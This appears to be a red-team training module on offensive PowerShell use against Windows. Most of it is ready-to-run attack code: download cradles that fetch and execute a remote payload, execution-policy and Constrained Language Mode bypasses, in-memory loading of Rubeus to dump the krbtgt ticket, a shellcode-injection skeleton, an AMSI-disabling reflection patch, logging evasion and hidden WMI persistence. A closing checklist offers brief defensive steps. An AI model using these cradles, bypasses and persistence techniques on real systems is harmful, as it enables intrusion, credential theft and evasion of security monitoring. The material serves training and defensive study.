
# PowerShell: The Operator's Weapon of Choice

## 1. Introduction
PowerShell is not just a shell; it is a **management engine** built on the .NET Framework. For a Red Teamer, it is the ultimate "Living off the Land" (LotL) tool because it grants full access to the Win32 API and the .NET Class Library without dropping a single file to disk.

However, modern Windows (10/11/Server 2019+) has introduced massive defensive capabilities (AMSI, CLM, Script Block Logging). This module moves beyond basic cmdlets into advanced tradecraft: in-memory execution, evasion, and deep introspection.

---

## 2. The PowerShell Architecture

### 2.1 The Engine vs. The Host
*   **The Engine**: `System.Management.Automation.dll`. This is the core logic.
*   **The Host**: `powershell.exe` (Console Host) or `ise.exe` (ISE Host).
*   **Implication**: You don't need `powershell.exe` to run PowerShell. You can write a C# program (or use a macro) that loads the automation DLL and executes scripts directly in memory. This bypasses "Block powershell.exe" block rules.

### 2.2 Execution Policies (The "Not-Security" Boundary)
Execution Policy (`Set-ExecutionPolicy`) only controls the loading of `.ps1` files from disk. It does not stop:
*   Pasting code into the console.
*   Piping code: `echo "Write-Host Pwned" | powershell -`
*   Command switch: `powershell -Command "Write-Host Pwned"`
*   Encoded Command: `powershell -EncodedCommand <Base64>`

**Bypass Techniques**:
```bash
# 1. The Standard
powershell -ExecutionPolicy Bypass -File script.ps1

# 2. The Scope Trick (Changes policy for the current process only)
Set-ExecutionPolicy Bypass -Scope Process

# 3. The Registry (If you have access)
reg add HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell /v ExecutionPolicy /t REG_SZ /d Bypass /f
```

---

## 3. Offensive Tradecraft

### 3.1 Download Cradles (Fileless Delivery)
A "Cradle" is a one-liner that downloads and executes a payload from a remote server into memory.

**1. The Classic (WebClient)**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')
```
*   *Pros*: Simple, reliable.
*   *Cons*: `Net.WebClient` User-Agent is flagged by proxies. Writes temporary files to IE cache.

**2. The Modern (Invoke-WebRequest / iwr)**
```powershell
IEX (iwr 'http://10.10.10.10/payload.ps1' -UseBasicParsing)
```
*   *Note*: `iwr` is an alias for `Invoke-WebRequest`. `-UseBasicParsing` prevents IE initialization errors.

**3. The Stealthy (.NET Stream)**
Avoids some proxy flags by using raw streams.
```powershell
$s=New-Object IO.MemoryStream((New-Object Net.WebClient).DownloadData('http://10.10.10.10/payload.ps1'));IEX (New-Object IO.StreamReader($s)).ReadToEnd()
```

### 3.2 Reflection & Assembly Loading
PowerShell can load compiled .NET DLLs (Assemblies) from memory or disk.

**Scenario**: You have `Rubeus.exe` (C# tool). You don't want to drop it to disk.
1.  **Base64 Encode** the binary on your attacker machine.
2.  **Load** it in PowerShell:
```powershell
$b64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAA..."
$bytes = [System.Convert]::FromBase64String($b64)
[System.Reflection.Assembly]::Load($bytes)
```
3.  **Execute**:
```powershell
[Rubeus.Program]::Main("dump /service:krbtgt".Split())
```

### 3.3 Accessing Win32 APIs (P/Invoke)
PowerShell allows defining C# code inline (`Add-Type`) to call kernel functions. This is critical for shellcode injection.

**Code: The "Mini-Injector"**
```powershell
$Code = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("msvcrt.dll")]
        public static extern IntPtr memset(IntPtr dest, int c, int count);
    }
"@
$Win32 = Add-Type -MemberDefinition $Code -Name "Win32" -Namespace Win32 -PassThru

# 1. Allocate Memory (RWX)
$size = 1024
$addr = $Win32::VirtualAlloc(0, $size, 0x1000, 0x40)

# 2. Copy Shellcode (Pseudo-code)
# [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

# 3. Execute
$Win32::CreateThread(0, 0, $addr, 0, 0, 0)
```

---

## 4. Defensive Mechanisms & Evasion

### 4.1 Antimalware Scan Interface (AMSI)
AMSI is the "Game Changer". Before any script block is executed, PowerShell sends it to `AMSI.dll`, which talks to the AV (Defender, CrowdStrike).

**How it works**:
1.  User types `Invoke-Mimikatz`.
2.  PowerShell engine calls `AmsiScanBuffer()`.
3.  Defender signatures scan the buffer.
4.  If Malicious -> Execution blocked.

**Evasion 1: Obfuscation**
Break the signatures.
*   **String Splitting**: `'In'+'voke-Mi'+'mikatz'`
*   **Base64 Encoding**: `[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('SW52b2tlLU1pbWlrYXR6'))`
*   **Logic Obfuscation**: Adding useless loops/variables. Tools: **Invoke-Obfuscation** (Daniel Bohannon).

**Evasion 2: AMSI Memory Patching (The "AmsiScanBuffer" Patch)**
We force the `AmsiScanBuffer` function in memory to always return `AMSI_RESULT_CLEAN` (0).
*   *Note*: Modern Defender flags the patch code itself. You must obfuscate the patch.
```powershell
# Conceptual Patch (Detected, do not use raw)
$Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Context = $Ref.GetField('amsiContext', 'NonPublic,Static')
$Context.SetValue($null, [IntPtr]::Zero)
```

### 4.2 Constrained Language Mode (CLM)
CLM is enforced when **AppLocker** or **WDAC** (Windows Defender Application Control) is active in "Enforce" mode.
*   **Restrictions**:
    *   No direct .NET scripting (`New-Object` limited).
    *   No `Add-Type` (No C# compilation).
    *   No accessing non-allowed types/properties.
*   **Verification**: `$ExecutionContext.SessionState.LanguageMode` (Should be `FullLanguage` or `ConstrainedLanguage`).

**Bypass**:
1.  **PowerShell Downgrade**: `powershell -version 2` (If PSv2 feature is enabled). PSv2 does not support CLM or AMSI.
2.  **Build Tools**: Use `InstallUtil.exe` or `MSBuild.exe` (Living off the Land Binaries) to execute C# code that launches a FullLanguage runspace.

### 4.3 Script Block Logging
Logs the *de-obfuscated* code to Event Viewer (Event ID 4104).
*   **Attacker View**: If I run encoded commands, the logs see the cleartext.
*   **Bypass**:
    *   Disable via Reflection (similar to AMSI patching).
    *   Modify the Group Policy Registry keys (Requires Admin).
    *   Downgrade to PSv2.

---

## 5. Advanced Scenarios

### Scenario: The "Invisible" Persistence
**Goal**: Persist on a machine using a WMI Event Subscription (Fileless).
**Mechanism**:
1.  **Event Filter**: "Watch for system uptime > 200 seconds".
2.  **Event Consumer**: "Run this PowerShell command".
3.  **Binding**: Connect Filter to Consumer.
**Code**:
```powershell
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "Updater"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "Updater"
    CommandLineTemplate = "powershell.exe -NoP -NonI -W Hidden -Enc <Base64Payload>"
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```
**Detection**: `Get-WmiObject -Namespace root\subscription ...`

---

## 6. Diagrams (ASCII)

### AMSI vs. Obfuscation vs. Memory Patching

```text
                  +------------------+
                  |  Attacker Script |
                  +--------+---------+
                           |
            +--------------v--------------+
            |      Obfuscation Layer      | <--- (1) Splits strings, changes names
            +--------------+--------------+      (Bypasses Static Signatures)
                           |
            +--------------v--------------+
            |      PowerShell Engine      |
            +--------------+--------------+
                           |
             [AMSI Trigger: "Scan This!"]
                           |
            +--------------v--------------+
            |         AMSI.DLL            | <--- (2) Memory Patching targets this.
            |   (AmsiScanBuffer Func)     |      We overwrite the start of this
            +--------------+--------------+      function to "return 0" immediately.
                           |
            +--------------v--------------+
            |      Antivirus Engine       |
            |   (Defender / SentinelOne)  |
            +-----------------------------+
```

---

## 7. Operational Checklist

### Red Team (Attacker)
1.  **Check Language Mode**: `$ExecutionContext.SessionState.LanguageMode`.
2.  **Check Logging**: Is `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging` set?
3.  **Obfuscate**: Never run raw scripts from GitHub. Use tools like `Chameleon` or manual string manipulation.
4.  **Use Cradles**: Load from memory, never touch disk.

### Blue Team (Defender)
1.  **Enable Logging**: Turn on Module, Script Block, and Transcription logging via GPO.
2.  **Monitor Events**:
    *   **4104**: Script Block (Read the code).
    *   **4103**: Module Pipeline.
3.  **Remove PSv2**: `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`.
4.  **Constrain**: Enforce AppLocker/WDAC to force CLM on regular users.

---

## 8. References
- [[01_Windows_OS_Architecture]]
- [[07_Active_Directory_Enumeration]]
- [[10_Windows_Persistence_Mechanisms]]

# End of Document
